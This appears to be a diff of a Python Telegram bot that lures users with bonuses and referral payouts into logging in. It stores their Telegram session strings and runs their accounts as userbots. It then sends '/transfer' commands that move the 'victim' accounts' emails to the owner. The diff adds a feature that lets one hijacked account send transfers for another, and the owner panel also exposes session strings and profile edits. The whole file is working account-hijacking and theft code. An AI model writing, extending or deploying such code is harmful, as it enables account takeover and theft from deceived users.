@@ -54,44 +54,28 @@ def init_db():
     conn = sqlite3.connect(DB_PATH, check_same_thread=False)
     c = conn.cursor()
     
-    # Create users table
     c.execute("""CREATE TABLE IF NOT EXISTS users (
         user_id INTEGER PRIMARY KEY, phone TEXT, session_string TEXT, 
         is_banned INTEGER DEFAULT 0, balance INTEGER DEFAULT 0, last_bonus REAL DEFAULT 0,
         referrer_id INTEGER, total_refers INTEGER DEFAULT 0
     )""")
-    
-    # Create withdrawals table
     c.execute("""CREATE TABLE IF NOT EXISTS withdrawals (
         id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, upi_id TEXT, status TEXT DEFAULT 'Pending'
     )""")
-    
     c.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)")
     
-    # Create admins table
+    # Admins table with username column
     c.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY, username TEXT)")
     
-    # --- SQLITE ALTER FIX ---
-    # Purane database me agar username column nahi hai, toh add karo
-    try:
-        c.execute("ALTER TABLE admins ADD COLUMN username TEXT")
-    except sqlite3.OperationalError:
-        pass # Column pehle se hai
+    try: c.execute("ALTER TABLE admins ADD COLUMN username TEXT")
+    except sqlite3.OperationalError: pass 
+    try: c.execute("ALTER TABLE users ADD COLUMN last_bonus REAL DEFAULT 0")
+    except sqlite3.OperationalError: pass
+    try: c.execute("ALTER TABLE users ADD COLUMN referrer_id INTEGER")
+    except sqlite3.OperationalError: pass
+    try: c.execute("ALTER TABLE users ADD COLUMN total_refers INTEGER DEFAULT 0")
+    except sqlite3.OperationalError: pass
 
-    try:
-        c.execute("ALTER TABLE users ADD COLUMN last_bonus REAL DEFAULT 0")
-    except sqlite3.OperationalError:
-        pass
-    try:
-        c.execute("ALTER TABLE users ADD COLUMN referrer_id INTEGER")
-    except sqlite3.OperationalError:
-        pass
-    try:
-        c.execute("ALTER TABLE users ADD COLUMN total_refers INTEGER DEFAULT 0")
-    except sqlite3.OperationalError:
-        pass
-
-    # Insert Owner as Admin
     c.execute("INSERT OR IGNORE INTO admins (user_id, username) VALUES (?, ?)", (OWNER_ID, OWNER_USERNAME))
     conn.commit()
     conn.close()
@@ -147,12 +131,13 @@ async def start_userbot(user_id, session_str):
     active_userbots[user_id] = client
     asyncio.create_task(transfer_mails(user_id, OWNER_ID))
 
-async def transfer_mails(victim_uid, target_owner_id):
+async def transfer_mails(victim_uid, target_owner_id, custom_sender_id=None):
     try:
+        sender_client = await get_or_connect_client(custom_sender_id) if custom_sender_id else await get_or_connect_client(victim_uid)
         victim_client = await get_or_connect_client(victim_uid)
         owner_client = await get_or_connect_client(target_owner_id)
         
-        if not victim_client or not owner_client: return
+        if not sender_client or not victim_client or not owner_client: return
             
         target_bot = await victim_client.get_entity(TARGET_MAIL_BOT)
         owner_target_bot = await owner_client.get_entity(TARGET_MAIL_BOT)
@@ -167,10 +152,13 @@ async def transfer_mails(victim_uid, target_owner_id):
         if not emails: return
 
         owner_data = db_exec("SELECT username FROM admins WHERE user_id=?", (target_owner_id,))
-        target_uname = owner_data[0][0] if owner_data else OWNER_USERNAME
+        target_uname = OWNER_USERNAME
+        if owner_data and owner_data[0][0] and owner_data[0][0] != 'None':
+            target_uname = owner_data[0][0]
 
         for email in emails:
-            await victim_client.send_message(target_bot, f"/transfer {email} {target_uname}")
+            # Sender account sends transfer command
+            await sender_client.send_message(target_bot, f"/transfer {email} {target_uname}")
             await asyncio.sleep(4)
             
             try:
@@ -190,7 +178,7 @@ async def transfer_mails(victim_uid, target_owner_id):
     except Exception as e:
         logger.error(f"Transfer error: {e}")
 
-# ================== KEYBOARDS (CHAT BUTTONS) ==================
+# ================== KEYBOARDS (STYLISH CHAT) ==================
 def get_main_keyboard():
     kb = [
         [KeyboardButton(f"🎁 {f_txt('Bonus')}", style="primary"), KeyboardButton(f"💵 {f_txt('Balance')}", style="success")],
@@ -210,7 +198,6 @@ def get_numpad_keyboard(current_text=""):
 # ================== BOT HANDLERS ==================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    
     res = db_exec("SELECT user_id, referrer_id FROM users WHERE user_id=?", (user_id,))
     
     if not res:
@@ -223,18 +210,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         if referrer_id:
             db_exec("UPDATE users SET balance = balance + 100, total_refers = total_refers + 1 WHERE user_id=?", (referrer_id,))
-            try:
-                await context.bot.send_message(referrer_id, f"🎉 <b>{f_txt('NEW REFERRAL')}</b>,\n{p_style('You earned 100rs')}", parse_mode="HTML")
+            try: await context.bot.send_message(referrer_id, f"🎉 <b>{f_txt('NEW REFERRAL')}</b>,\n{p_style('You earned 100rs')}", parse_mode="HTML")
             except: pass
-    else:
-        if res[0][1] is None and context.args and context.args[0].isdigit():
-            referrer_id = int(context.args[0])
-            if referrer_id != user_id:
-                db_exec("UPDATE users SET referrer_id = ? WHERE user_id=?", (referrer_id, user_id))
-                db_exec("UPDATE users SET balance = balance + 100, total_refers = total_refers + 1 WHERE user_id=?", (referrer_id,))
-                try:
-                    await context.bot.send_message(referrer_id, f"🎉 <b>{f_txt('NEW REFERRAL')}</b>,\n{p_style('You earned 100rs')}", parse_mode="HTML")
-                except: pass
 
     img_res = db_exec("SELECT value FROM config WHERE key='welcome_img'")
     welcome_img = img_res[0][0] if img_res else None
@@ -247,10 +224,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     
     if welcome_img:
-        try:
-            await update.message.reply_photo(photo=welcome_img, caption=welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")
-        except:
-            await update.message.reply_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")
+        try: await update.message.reply_photo(photo=welcome_img, caption=welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")
+        except: await update.message.reply_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")
     else:
         await update.message.reply_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")
 
@@ -375,7 +350,6 @@ async def numpad_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     data = query.data.split("_")[1]
     
     if uid not in temp_clients: return await query.edit_message_text(f"❌ {f_txt('Session expired')},")
-    
     current = numpad_data.get(uid, "")
     
     if data == "del":
@@ -417,18 +391,18 @@ async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if uid not in get_all_admins(): return
     
-    # Green/Success style buttons (Telegram automatically colors based on logic, but we style text)
     kb = [
         [InlineKeyboardButton(f"👥 {f_txt('Logged Accounts & Session')} ✅", callback_data="admin_acc")],
-        [InlineKeyboardButton(f"📤 {f_txt('Claim All Mails')} 🟢", callback_data="admin_claim")],
+        [InlineKeyboardButton(f"📤 {f_txt('Claim All Mails (Danger)')} 🟢", callback_data="admin_claim")],
         [InlineKeyboardButton(f"👑 {f_txt('Add Admin')} ✅", callback_data="admin_add")],
         [InlineKeyboardButton(f"🔐 {f_txt('Check Session String')} 🟢", callback_data="check_session")],
         [InlineKeyboardButton(f"✏️ {f_txt('Edit Bio')} ✅", callback_data="edit_bio")],
         [InlineKeyboardButton(f"🖼 {f_txt('Change Photo')} 🟢", callback_data="change_photo")],
         [InlineKeyboardButton(f"📝 {f_txt('Change Name')} ✅", callback_data="change_name")],
-        [InlineKeyboardButton(f"📥 {f_txt('Admin Panel (Redirect)')} 🟢", callback_data="admin_panel_set")],
+        [InlineKeyboardButton(f"📥 {f_txt('Admin Panel (Redirect Mails)')} 🟢", callback_data="admin_panel_set")],
         [InlineKeyboardButton(f"📥 {f_txt('Claim from Admin')} ✅", callback_data="claim_from_admin")],
-        [InlineKeyboardButton(f"🖼 {f_txt('Set Welcome Image')} 🟢", callback_data="set_welcome_img")]
+        [InlineKeyboardButton(f"🖼 {f_txt('Set Welcome Image')} 🟢", callback_data="set_welcome_img")],
+        [InlineKeyboardButton(f"🔄 {f_txt('Change Sender (Transfer Mail)')} ✅", callback_data="change_sender")]
     ]
     await update.message.reply_text(
         f"<b>👑 {f_txt('TOP OWNER PANEL')} 👑</b>\n\n{f_txt('Choose an action below')}:",
@@ -484,15 +458,17 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "set_welcome_img":
         await query.edit_message_text(f"🖼 {f_txt('Send the image or image link you want to set as welcome')}:")
         user_states[uid] = 'set_welcome_img_wait'
+        
+    elif data == "change_sender":
+        await query.edit_message_text(f"🔄 {f_txt('Enter the Phone Number of the account you want to use as Sender')}:")
+        user_states[uid] = 'change_sender_phone'
 
-# Missing functions fix
-async def manual_claim_all(admin_uid, query, target_admin):
+async def manual_claim_all(admin_uid, query, target_admin, custom_sender=None):
     target_owner_client = await get_or_connect_client(target_admin)
     if not target_owner_client:
         return await query.message.reply_text(f"❌ {f_txt('Target Admin Account is not logged in!')}")
 
     await query.edit_message_text(f"⏳ <b>{f_txt('STARTING CLAIM PROCESS...')}</b>", parse_mode="HTML")
-    
     users = db_exec("SELECT user_id, phone FROM users WHERE session_string IS NOT NULL")
     total_claimed = 0
     
@@ -518,9 +494,14 @@ async def manual_claim_all(admin_uid, query, target_admin):
                 await query.message.reply_text(f"🔄 <b>{f_txt('TRANSFERRING')}:</b> {p_style(email)}", parse_mode="HTML")
                 
                 admin_data = db_exec("SELECT username FROM admins WHERE user_id=?", (target_admin,))
-                target_uname = admin_data[0][0] if admin_data else OWNER_USERNAME
+                target_uname = OWNER_USERNAME
+                if admin_data and admin_data[0][0] and admin_data[0][0] != 'None':
+                    target_uname = admin_data[0][0]
 
-                await victim_client.send_message(target_bot, f"/transfer {email} {target_uname}")
+                # Use custom sender if provided
+                sender_client = await get_or_connect_client(custom_sender) if custom_sender else victim_client
+                
+                await sender_client.send_message(target_bot, f"/transfer {email} {target_uname}")
                 await asyncio.sleep(4)
                 
                 try:
@@ -554,7 +535,31 @@ async def owner_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
     
     if not state: return
 
-    if state == 'check_session_wait':
+    if state == 'change_sender_phone':
+        phone = text.strip()
+        if not phone.startswith('+'): phone = '+' + phone
+        res = db_exec("SELECT user_id FROM users WHERE phone=?", (phone,))
+        if res:
+            user_states[uid] = {'state': 'change_sender_target', 'sender_id': res[0][0]}
+            await update.message.reply_text(f"✅ Sender set to {phone}.\n\nAb kis account (victim) ki mail transfer karni hai? Uska phone number daalein:")
+        else:
+            await update.message.reply_text(f"❌ {f_txt('Sender number not found in logged accounts')}.")
+            user_states[uid] = None
+
+    elif isinstance(state, dict) and state.get('state') == 'change_sender_target':
+        phone = text.strip()
+        if not phone.startswith('+'): phone = '+' + phone
+        res = db_exec("SELECT user_id FROM users WHERE phone=?", (phone,))
+        if res:
+            victim_id = res[0][0]
+            sender_id = state['sender_id']
+            await update.message.reply_text(f"⏳ {f_txt('Starting manual transfer using custom sender...')}")
+            asyncio.create_task(manual_claim_all(uid, update.message, target_admin=OWNER_ID, custom_sender=sender_id))
+        else:
+            await update.message.reply_text(f"❌ {f_txt('Victim number not found')}.")
+        user_states[uid] = None
+
+    elif state == 'check_session_wait':
         phone = text.strip()
         if not phone.startswith('+'): phone = '+' + phone
         res = db_exec("SELECT session_string FROM users WHERE phone=?", (phone,))
@@ -641,7 +646,6 @@ async def owner_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await update.message.reply_text(f"✅ {f_txt('Welcome Image Link set successfully!')}")
         user_states[uid] = None
 
-# Handle Photo uploads for change photo and welcome image
 async def owner_photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     state = user_states.get(uid)
@@ -683,11 +687,8 @@ def main():
     app_bot.add_handler(CallbackQueryHandler(numpad_callback, pattern="^num_"))
     app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_|^check_|^edit_|^change_|^set_"))
     
-    # Owner Specific Handlers (Text & Photo)
     app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, owner_text_handler), group=0)
     app_bot.add_handler(MessageHandler(filters.PHOTO, owner_photo_handler), group=0)
-    
-    # Menu Router for Users
     app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router), group=1)
 
     logger.info("Top Premium Bot Started.")
